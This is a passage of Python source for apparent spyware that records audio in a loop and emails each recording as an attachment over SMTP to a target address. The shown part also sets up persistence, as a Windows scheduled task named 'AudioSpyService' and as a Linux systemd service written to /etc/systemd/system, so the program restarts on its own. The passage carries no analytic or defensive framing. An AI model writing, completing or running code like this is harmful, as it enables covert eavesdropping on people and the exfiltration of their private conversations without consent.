        with open(file_path, 'rb') as file:
            part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
        msg.attach(part)
        
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(email_user, email_pass)
            server.sendmail(email_user, target_email, msg.as_string())
    
    def create_persistence():
        if platform.system() == 'Windows':
            service_name = 'AudioSpyService'
            command = f'schtasks /create /tn {service_name} /tr "{os.path.abspath(__file__)}" /sc minute /mo 10'
            subprocess.run(command, shell=True)
        elif platform.system() == 'Linux':
            service_name = 'audiospy'
            service_content = f'''[Unit]
Description=Audio Spy Service

[Service]
ExecStart={os.path.abspath(__file__)}
Restart=always

[Install]
WantedBy=multi-user.target
'''
            with open(f'/etc/systemd/system/{service_name}.service', 'w') as f:
                f.write(service_content)
            subprocess.run(['systemctl', 'daemon-reload'])
            subprocess.run(['systemctl', 'enable', service_name])
            subprocess.run(['systemctl', 'start', service_name])
    
    create_persistence()
    
    while True:
        record_audio(output_file)
        send_email(output_file)
        time.sleep(60)  # Wait for 1 minute before recording again
